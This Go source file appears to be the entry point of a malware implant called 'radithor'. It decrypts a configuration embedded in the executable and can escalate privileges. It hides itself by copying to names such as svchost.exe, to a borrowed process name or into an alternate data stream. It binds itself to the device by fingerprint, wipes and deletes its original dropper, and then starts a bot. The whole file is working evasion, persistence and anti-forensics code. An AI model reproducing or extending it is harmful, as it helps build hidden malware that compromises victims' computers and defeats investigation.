package main

import (
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"shared"
	"shared/config"
	"shared/patch"

	"radithor/bot"
	"radithor/core"
	"radithor/core/lockdown"
	"radithor/funcs"
	"radithor/store"
	"radithor/utils"

	"github.com/horobimasu/gotils"
)

const (
	_ARGS_IDX_EXEC_PATH      int = 0
	_ARGS_IDX_PATH_TO_DELETE int = 1
	_ARGS_IDX_PID_TO_KILL    int = 2
)

const (
	_OLD_FILE_DELETE_MAX_TRIES uint = 10
	_OLD_FILE_CORRUPT_PASSES   uint = 3
)

func main() {
	err := core.CreateMutex()
	if err != nil {
		core.LogError("[main] mutex active")
		os.Exit(0)
	}

	store.InitState()

	err = initConfig()
	if err != nil {
		core.LogError("[main] failed to init config - %v", err)
		os.Exit(0)
	}

	argc, argv := len(os.Args), os.Args
	core.LogInfo("[main] all args (%d): %v", argc, argv)

	switch argc {
	case 1: // exec path
		savedState, err := utils.Deserialize[patch.SavedState](patch.RawSavedState)
		if err != nil {
			core.LogError("[main] failed to deserialize saved state - %v", err)
			os.Exit(0)
		}

		if savedState.InitDone {
			start(savedState)
		} else {
			setup(savedState)
		}

	case 3: // exec path + old rad file path + initial rad pid
		firstStart(argv)

	default:
		core.LogError("[main] unexpected args: (%d), %v", argc, argv)
		core.Wipe(false)
	}
}

func setup(savedState patch.SavedState) {
	core.LogInfo("[setup] reached!")

	if config.GetConfigAny[bool](store.REQUIRE_ADMIN) {
		funcs.ElevateWithConfig()
	}

	useRandomDir := config.GetConfigAny[bool](store.RANDOMIZE_DIRECTORY)
	useCustomDir := config.GetConfigAny[bool](store.USE_CUSTOM_DIRECTORY)
	customeDirPath := config.GetConfigString(store.CUSTOM_DIRECTORY_PATH)

	useRandomName := config.GetConfigAny[bool](store.RANDOMIZE_NAME)
	useCustomName := config.GetConfigAny[bool](store.USE_CUSTOM_NAME)
	customName := config.GetConfigString(store.CUSTOM_NAME)

	useAds := config.GetConfigAny[bool](store.USE_ALTERNATE_DATA_STREAM)
	adsPath := config.GetConfigString(store.CUSTOM_ALTERNATE_DATA_STREAM)

	var newDirPath string
	var newFileName string
	var newInstallPath string
	var installedToAds bool

	if useAds && strings.Contains(adsPath, ":") {
		newFileName = adsPath
		installedToAds = true
	}

	if !installedToAds {
		if useRandomDir {
			var err error

			newDirPath, err = utils.GetRandomDir("~", 4, 20, []string{"!cache", "!log", "!bin", "!db"})
			if err != nil {
				core.LogWarning("[setup] failed to get random dir - %v", err)

				if store.IsElevated {
					newDirPath = "%PROGRAMFILES%\\Windows Media Player"
				} else {
					newDirPath = "%USERPROFILE%\\Music"
				}
			}
		} else if useCustomDir {
			newDirPath = customeDirPath
		} else {
			if store.IsElevated {
				newDirPath = "%PROGRAMFILES%\\Windows Media Player"
			} else {
				newDirPath = "%USERPROFILE%\\Music"
			}
		}

		if useRandomName {
			randomProc, err := utils.GetRandomRunningProc()
			if err != nil {
				core.LogWarning("[setup] failed to get random name - %v", err)
				newFileName = "svchost.exe"
			} else {
				newFileName = randomProc.Name
			}
		} else if useCustomName {
			newFileName = customName
		} else {
			newFileName = "svchost.exe"
		}

		newDirPath = gotils.ExpandPath(newDirPath)
		newInstallPath = filepath.Join(newDirPath, newFileName)
		newInstallPath = filepath.Clean(newInstallPath)
	} else {
		newInstallPath = gotils.ExpandPath(newFileName)
	}

	core.LogInfo("[setup] new install path: %s", newInstallPath)

	err := gotils.CopyFile(store.ExecPath, newInstallPath)
	if err != nil {
		core.LogError("[setup] failed to copy file to new install path - %v", err)
		os.Exit(0)
	}

	savedState.InitDone = true

	if config.GetConfigAny[bool](store.AGGRESSIVE_LAUNCH_CHECKS) {
		fingerprint, err := core.GenerateFingerprint()
		if err != nil {
			core.LogError("[setup] failed to generate fingerprint - %v", err)
			os.Exit(0)
		}

		savedState.DeviceFingerprint = fingerprint
	}

	newSavedState, err := utils.Serialize(savedState)
	if err != nil {
		core.LogError("[setup] failed to serialize saved state - %v", err)
		os.Exit(0)
	}

	err = gotils.ReplaceFileBytesFromLeading(newInstallPath, savedState.Fingerprint[:], newSavedState)
	if err != nil {
		core.LogError("[setup] failed to patch new file - %v", err)
		os.Exit(0)
	}

	core.LogInfo(
		"[setup] launching new file... %q [%q %d]",
		newInstallPath,
		store.ExecPath,
		os.Getpid(),
	)

	if config.GetConfigAny[bool](store.INSTANT_PANIC_MODE) {
		err = lockdown.EnablePanicMode()
		if err != nil {
			core.LogWarning("[setup] failed to enable panic mode - %v", err)
		}
	}

	gotils.RunCommand(newInstallPath, store.ExecPath, strconv.Itoa(os.Getpid()))
}

func start(savedState patch.SavedState) {
	core.LogInfo("[start] reached!")

	if !checkCanLaunch(savedState) {
		core.LogError("[start] failed checkCanLaunch")
		os.Exit(0)
	}
}

func firstStart(argv []string) {
	core.LogInfo("[firstStart] reached!")

	oldProcPid, err := strconv.ParseUint(argv[_ARGS_IDX_PID_TO_KILL], 10, 32)
	if err != nil {
		core.LogError("[firstStart] failed to parse old proc pid - %v", err)
		os.Exit(0)
	}

	err = utils.TerminateProc(uint32(oldProcPid))
	if err != nil {
		core.LogWarning("[firstStart] failed to kill old proc - %v", err)
	} else {
		core.LogInfo("[firstStart] killed old proc (%d)", oldProcPid)
	}

	time.Sleep(500 * time.Millisecond)

	info, err := os.Stat(argv[_ARGS_IDX_PATH_TO_DELETE])
	if err != nil || info.IsDir() {
		core.LogError("[firstStart] path to delete is a dir or stat return error - %v", err)
		os.Exit(0)
	}

	for i := range _OLD_FILE_DELETE_MAX_TRIES {
		if i == _OLD_FILE_DELETE_MAX_TRIES-1 {
			core.LogWarning("failed to delete old file")
		}

		err = utils.CorruptFile(argv[_ARGS_IDX_PATH_TO_DELETE], _OLD_FILE_CORRUPT_PASSES)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		core.LogInfo("[firstStart] corrupted old file with %d passes on %d try", _OLD_FILE_CORRUPT_PASSES, i+1)

		err = os.Remove(argv[_ARGS_IDX_PATH_TO_DELETE])
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		core.LogInfo("[firstStart] deleted old file on %d try", i+1)
		break
	}

	bot.StartBot()
}

func checkCanLaunch(savedState patch.SavedState) bool {
	fingerprint, err := core.GenerateFingerprint()
	if err != nil {
		core.LogError("[checkCanLaunch] failed to generate fingerprint - %v", err)
		return false
	}

	return fingerprint == savedState.DeviceFingerprint
}

func initConfig() error {
	configData, err := utils.Deserialize[patch.EncryptedConfigData](patch.RawEncryptedConfigData)
	if err != nil {
		return err
	}

	decryptedRawConfigData, err := config.GetAndDecryptConfig(
		store.ExecPath,
		shared.RADITHOR_CONFIG_PE_SECTION_NAME,
		configData.EncryptionKey[:],
	)

	if err != nil {
		return err
	}

	config.RegisterConfig(decryptedRawConfigData)

	return nil
}
